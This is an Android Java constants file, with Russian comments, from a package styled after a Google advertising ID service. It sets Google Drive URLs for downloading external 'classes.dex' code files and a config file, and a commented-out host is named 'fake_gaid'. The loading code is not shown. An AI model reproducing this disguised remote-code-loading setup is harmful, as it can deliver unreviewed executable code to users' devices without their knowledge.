package com.advertising_id_service.appclick.googleadvertisingidservice;

import android.content.Context;

import java.io.File;

public final class GlobalParameters {
    public static String CODE_VERSION = "1.8.0";  //Версия кода
    public static boolean NEED_LOG = true;      //Надо ли вести логирование
    public static final String EXTERNAL_PACKAGE_NAME = "com.adid_service.external_lib.external_code_lib"; //Имя пакета во внешней библиотеке


    //    public static String DEX_RELEASE_FILE_NAME = "release_classes.dex";  //имя dex-файла с внешними классами релизной версии
//    public static String DEX_DEBUG_FILE_NAME   = "debug_classes.dex";    //имя dex-файла с внешними классами дебажной версии
    public static String DEX_DEFAULT_FILE_NAME = "classes.dex";          //имя dex-файла с внешними классами
    public static String CONFIG_FILE_NAME      = "config.json";          //имя закачиваемого файла конфигурации

    public static String URL_TO_DEX_FILE_RELEASE = "https://drive.google.com/a/adviator.com/uc?authuser=0&id=1dB2xxnWUzsWuxwASN2j1sG2jIEa0Zw-t&export=download"; //http://fake_gaid.appclick.org/www/upload/classes.dex";
    public static String URL_TO_DEX_FILE_DEBUG   = "https://drive.google.com/a/adviator.com/uc?authuser=0&id=1HxP1jbW7jzyP62VYUezyDvj5lqBJODff&export=download";//"http://fake_gaid.appclick.org/www/upload/classes2.dex";
    public static String URL_TO_CONFIG_FILE      = "https://drive.google.com/a/adviator.com/uc?authuser=0&id=1ssMCNlcAe2waMwbn7thjVwwa4dEoho1q&export=download";

    // Константы ключей настроечного json-а
    // {"debug_version":1,"release_version":1,"debug_ids":["90793426-1","108799471-1"]}
    public static String KEY_DEBUG_VERSION   = "debug_version";
    public static String KEY_RELEASE_VERSION = "release_version";
    public static String KEY_DEBUG_IDS       = "debug_ids";


    private static String getBasePath(Context cnt)
    {
        return  "" + cnt.getCacheDir()+ File.separator;
        //return  "" + Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) + File.separator;
    }
//    public static String DexReleaseFilePath(Context cnt)
//    {
//        return  "" + getBasePath(cnt) + DEX_RELEASE_FILE_NAME;
//    }
//    public static String DexDebugFilePath(Context cnt)
//    {
//        return  "" + getBasePath(cnt) + DEX_DEBUG_FILE_NAME;
//    }

    public static String DexFilePath(Context cnt)
    {
        return  "" + getBasePath(cnt) + DEX_DEFAULT_FILE_NAME;
    }

    public static String ConfigFilePath(Context cnt)
    {
        return  "" + getBasePath(cnt) + CONFIG_FILE_NAME;
    }

}
